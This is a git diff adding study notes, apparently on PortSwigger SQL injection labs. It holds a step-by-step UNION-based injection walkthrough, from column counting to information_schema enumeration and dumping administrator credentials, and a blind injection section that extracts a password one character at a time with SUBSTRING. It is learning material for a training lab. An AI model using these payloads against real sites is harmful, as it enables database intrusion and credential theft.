@@ -980,8 +980,69 @@ To solve the lab, log in as the `administrator` user.
 
 >Note: You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
+![Open labs 0.8](images/lab-0.8-database-contents/open-lab-0.8.png)
+
+![Open parameter Gifts and active history 0.8](images/lab-0.8-database-contents/params-gift-active-proxy-0.8.png)
+
+![send repeater 0.8](images/lab-0.8-database-contents/send-repeater-0.8.png)
+
+![send repeater 0.8](images/lab-0.8-database-contents/send-repeater-0.8.png)
+
+![test error 0.8](images/lab-0.8-database-contents/test-error-0.8.png)
+
+![test comment 0.8](images/lab-0.8-database-contents/test-comment-0.8.png)
+
+![test order by 1 0.8](images/lab-0.8-database-contents/test-order-by-1-0.8.png)
+
+![test order by 2 0.8](images/lab-0.8-database-contents/test-order-by-2-0.8.png)
+
+![error order by 3 0.8](images/lab-0.8-database-contents/error-order-by-3-0.8.png)
+
+![test union select null null 0.8](images/lab-0.8-database-contents/test-union-null-0.8.png)
+
+![test union select a b 0.8](images/lab-0.8-database-contents/test-union-string-0.8.png)
+
+![test listing tables infromation schema 0.8](images/lab-0.8-database-contents/test-listing-tables-0.8.png)
+
+![find users tables 0.8](images/lab-0.8-database-contents/find-users-tables-0.8.png)
+
+![success find credentials columns 0.8](images/lab-0.8-database-contents/success-get-credential-columns-0.8.png)
+
+![success credentials administrator 0.8](images/lab-0.8-database-contents/success-get-credential-administrator-0.8.png)
+
+![verify user and password administrator 0.8](images/lab-0.8-database-contents/verify-credentials-0.8.png)
+
+![success login user and password administrator 0.8](images/lab-0.8-database-contents/success-login-credentials-0.8.png)
+
 ##### Tutorial
 
+1. Take a request from HTTP history and then send to repeater.
+2. Input `'` to see error behaviour and get comment `--` for see success respone.
+3. Try search error columns use `ORDER BY`
+```SQL
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3-- get error columns
+```
+4. Determine the number of columns use `UNION SELECT`
+```sql
+' UNION SELECT NULL,NULL--
+' UNION SELECT 'A','B'--
+```
+5. Use the following payload to retrieve the list of tables in the database
+```sql
+'+UNION SELECT table_name,+NULL FROM information_schema.tables--
+```
+6. find column name with name users table to get columns credentials.
+```sql
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE+table_name='users_abcdf'--
+```
+7. Copy and paste credentials columns find `username` and `password` `administor` use columns credential and name users table.
+```sql
+' UNION SELECT username_abdcf,+password_abcdf FROM users_abcdf--
+```
+8. Login `username` and `password`
+9. Correct success to login with account `administrator`
 
 ##### Reference
 
@@ -1016,9 +1077,67 @@ We enumerate the database's tables via `information_schema.tables`, narrow down 
 </details>
 
 ## Blind SQL injection
+
+In this section, we describe techniques for finding and exploiting blind SQL injection vulnerabilities.
+
 ### What is blind SQL injection?
+
+Blind SQL injection when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
+
+Many techniques such as `UNION` attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but diffrent techniques must be used.
+
 ### Exploiting blind SQL injection by triggering conditional responses
+
+Consider an application that uses cookies to gather analytics about usage. Requests to the application include a cookie header like this:
+```txt
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
+```
+When a request containing a `TrackingId` cookie is processed, the application uses a SQL query to determine whether this is a known user:
+```sql
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+```
+This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave diffrently depending on whether the query returns any data. If you submit a recognized `TrackingId`, the query returns data and you receive a "Welcome back" message in the response.
+
+This behaviour is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggreing diffrent responses conditionally, depending on an injected condition.
+
 #### Exploiting blind SQL injection by triggering conditional responses - Continued
+
+To understand how this exploit works, suppose that two requests are sent containing the following `TrackingId` cookie values is turn:
+
+```txt
+…xyz' AND '1'='1
+…xyz' AND '1'='2
+```
+- The first of these values causes the query to return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
+- The second value cause the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
+
+This allows us to determine the answer to any single injected condition, and extract data one piece at a time.
+
+For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and user called `Administrator`. You can determine the password for this users by sending a series of inputs to test the password one character at a time.
+
+To do this, start with the following input:
+
+```sql
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+```
+This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.
+
+Next, we send the following input:
+
+```sql
+xyz ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+```
+This does not returns the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater that `t`.
+
+Eventually, we send the following input, which returns the "Welcome back" message, thereby confiriming that the first character of the password is `s`:
+
+```sql
+xyz ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+```
+We cna continue this process to systematically determine the full password for the `Administrator` user.
+
+>Notes: The `SUBSTRING` fuction is called `SUBSTR` On some types of database. For more details, see the SQL injection cheat sheet.
+
 ##### Lab: Blind SQL injection with conditional responses
 
 ## Error-based SQL injection
